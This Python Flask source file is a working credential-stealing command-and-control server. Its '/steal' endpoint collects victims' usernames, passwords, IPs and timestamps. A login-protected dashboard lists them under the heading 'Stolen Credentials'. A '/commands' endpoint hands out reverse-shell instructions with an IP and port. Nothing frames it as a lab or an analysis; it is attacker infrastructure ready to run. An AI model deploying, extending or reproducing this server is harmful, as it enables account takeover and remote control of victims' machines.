from flask import Flask, render_template, request, redirect, url_for, session, flash, render_template_string
import sqlite3
import os
from werkzeug.security import generate_password_hash, check_password_hash
import secrets

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY") or os.urandom(32)
REGISTRATION_KEY = secrets.token_urlsafe(32)

DB_PATH = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data.db')

html = '''<head>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
</head>
<body>
<style>
/* Style flash messages */

.flash-messages {
  position: fixed;
  top: 30px; /* Distance from the top of the window */
  left: 50%;
  transform: translateX(-50%); /* Center the messages horizontally */
  z-index: 1000; /* Ensure the messages appear above other content */
  width: 90%; /* Adjust width as needed */
  max-width: 400px; /* Set a max-width for better presentation */
}

.flash-message {
  padding: 10px 20px;
  margin-bottom: 10px;
  border-radius: 5px;
  color: #721c24;
  opacity: 1;
  transition: opacity 0.5s ease;
  animation: fadeOut 2s forwards;
}

/*.flash-message {
padding: 10px;
margin-bottom: 10px;
}*/

.flash-message.error {
background-color: #f8d7da;
color: #721c24;
}

.flash-message.success {
background-color: #d4edda;
color: #155724;
}

/* Keyframes for fade-out animation */
@keyframes fadeOut {
  0% {
      opacity: 1; /* Fully visible */
      margin-top: 0; /* Keep the message in place */
  }
  80% {
      opacity: 1; /* Remain visible until near the end */
      margin-top: 0; /* Keep the message in place */
  }
  100% {
      opacity: 0; /* Fully transparent */
      margin-top: -7%; /* Move the message up so it doesn't block UI*/
  }
}
</style>
<header>
    <!-- Allows flashing messages in the html -->
    {% with messages = get_flashed_messages(with_categories=true) %}
        {% if messages %}
            <div class="flash-messages">
            {% for category, message in messages %}
                <div class="flash-message {{ category }}">{{ message }}</div>
            {% endfor %}
            </div>
        {% endif %}
    {% endwith %}
</header>
<nav class="navbar bg-light justify-content-end p-3">
  {% if session['username'] %}
    <p class="text-end me-3">Logged in as {{ session['username'] }}</p>
  {% else %}
    <form class="d-flex" method="post" action="/login">
        <input class="form-control me-2" type="text" name="username" placeholder="Username" required>
        <input class="form-control me-2" type="password" name="password" placeholder="Password" required>
        <button class="btn btn-primary" type="submit">Login</button>
    </form>
  {% endif %}
</nav>
BODY
</body>'''

def get_db_connection():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def create_db():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute('''CREATE TABLE IF NOT EXISTS data (
        username TEXT NOT NULL,
        password TEXT NOT NULL,
        ip TEXT NOT NULL,
        timestamp TEXT
        );
    ''')
    cur.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL
        );
    ''')
    conn.commit()
    conn.close()

def insert_data(username, password, ip, timestamp):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("INSERT INTO data(username, password, ip, timestamp) VALUES(?, ?, ?, ?)", (username, password, ip, timestamp))
    conn.commit()
    conn.close()

def get_data():
    conn = get_db_connection()
    cur = conn.cursor()
    data = cur.execute("SELECT * FROM data").fetchall()
    conn.close()
    return data

@app.route("/")
def home():
    if 'username' in session:
        data = get_data()
        table = '''
            <div class="container mt-5 text-center">
                <h2 class="mb-4">Stolen Credentials</h2>
                <table class="table table-bordered table-striped table-hover align-middle">
                    <thead class="table-dark">
                        <tr>
                            <th>Username</th>
                            <th>Password</th>
                            <th>IP</th>
                            <th>Date Retrieved</th>
                        </tr>
                    </thead>
                    <tbody>
                        TBODY
                    </tbody>
                </table>
            </div>
        '''
        table_row = '''
        <tr>
        <td>USERNAME</td>
        <td>PASSWORD</td>
        <td>IP</td>
        <td>DATE</td>
        </tr>'''
        table_body = ""
        for target in data:
            username, password, ip, timestamp = target['username'], target['password'], target['ip'], target['timestamp']
            row = table_row.replace("USERNAME", username).replace("PASSWORD", password).replace("IP", ip).replace("DATE", timestamp)
            table_body += row
        table = table.replace("TBODY", table_body)
        html_page = html.replace("BODY", table)
        return render_template_string(html_page)
    else:
        html_page = html.replace("BODY", "<h2>Nothing to see here...</h2>")
        return render_template_string(html_page)

@app.route('/steal', methods=['POST'])
def steal():
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.form.get('ip')
    timestamp = request.form.get('timestamp')
    insert_data(username, password, ip, timestamp)
    return ""

@app.route('/commands', methods=['POST'])
def command():
    type = request.form.get('type')
    if type=="REVERSE":
        port = request.form.get('port')
        ip = request.form.get('ip')
        return f'REVERSE port={port} ip={ip}'
    return ""

@app.route('/login', methods=['POST'])
def login():
     if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        conn = get_db_connection()
        cur = conn.cursor()
        # Retrieve hashed password for the given username
        cur.execute("SELECT password_hash FROM users WHERE username = ?", (username,))
        user_row = cur.fetchone()
        conn.close()

        # Checks hashed user password against database
        if user_row and check_password_hash(user_row['password_hash'], password):
            session['username'] = username
            flash('Login successful!', 'success')
            return redirect(url_for('home'))
        else:
            flash('Invalid username or password!', 'error')
            return redirect(url_for('home'))

@app.route('/register', methods=['POST'])
def register():
    username = request.form.get('username')
    password = request.form.get('password')
    key = request.form.get('key')

    if key != REGISTRATION_KEY:
        return 'Invalid admin key — registration denied.'

    password_hash = generate_password_hash(password)
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("INSERT INTO users (username, password_hash) VALUES (?, ?)", (username, password_hash))
        conn.commit()
        conn.close()
        return 'User registered successfully.'
    except sqlite3.IntegrityError:
        return 'Username already exists.'

if __name__ == "__main__":
    create_db()
    print(f"[DEBUG] Registration key: {REGISTRATION_KEY}")
    app.run(host='0.0.0.0', debug=False)
